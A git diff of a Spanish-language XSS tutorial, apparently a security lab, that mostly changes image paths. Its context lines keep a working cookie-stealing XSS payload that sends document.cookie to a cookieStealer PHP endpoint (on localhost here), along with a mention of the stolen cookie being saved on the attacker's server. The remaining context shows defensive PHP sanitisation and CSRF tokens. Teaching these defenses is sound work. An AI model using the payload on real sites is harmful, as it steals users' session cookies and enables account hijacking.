@@ -109,11 +109,9 @@ Copia en el archivo coockieStealer/index.php [este archivo php](files/steal.php)
 <script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
 ~~~
 
-![](images/xss4.png)
-
 En el archivo **cookie.txt** del servidor del atacante se habrán guardado los datos de nuestra cookie:
 
-![](images/xss8.png)
+![](Images/img2.png)
 
 Puedes investigar más en <https://github.com/TheWation/PhpCookieStealer/tree/master>
 
@@ -149,7 +147,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </form>
 ~~~
 
-![](files/xss5.png)
+![](Images/img3.png)
 
 La función que hemos creado al principio del documento: filter_string_polyfill nos va a eliminar todos los caracteres peligrosos y nos cambia caracteres conflictivos.
 
@@ -179,7 +177,7 @@ if (isset($_POST['comment'])) {
 </form>
 ~~~
 
-![](images/xss5.png)
+![](Images/img4.png)
 
 Aunque usar htmlspecialchars() es una buena medida para prevenir ataques XSS, todavía se puede mejorar la
 seguridad y funcionalidad del código con los siguientes puntos:
@@ -308,9 +306,12 @@ $_SESSION['csrf_token']; ?>">
 </html>
 ~~~
 
+
+![](Images/img5.png)
+
 Aquí está el código securizado:
 
-🔒 Medidas de seguridad implementadas
+Medidas de seguridad implementadas
 
 1. Eliminación de etiquetas HTML y caracteres nulos:
 
